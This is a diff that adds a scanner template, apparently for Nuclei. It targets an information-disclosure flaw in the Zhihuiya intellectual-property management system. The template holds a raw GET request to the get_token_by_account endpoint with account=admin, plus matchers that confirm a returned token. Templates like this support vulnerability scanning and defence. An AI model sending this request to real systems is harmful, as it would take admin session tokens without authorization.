@@ -1,0 +1,27 @@
+id: zhihuiya-get_token_by_account-info
+
+info:
+  name: 智慧芽知识产权信息管理系统 get_token_by_account 信息泄露漏洞
+  author: zhihuiya
+  severity: medium
+  tags: zhihuiya
+
+http:
+  - raw:
+      - |+
+        GET /innoe-passport/sso/get_token_by_account?account=admin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'error_code'
+          - 'error_message'
+          - '"token"'
+        condition: and
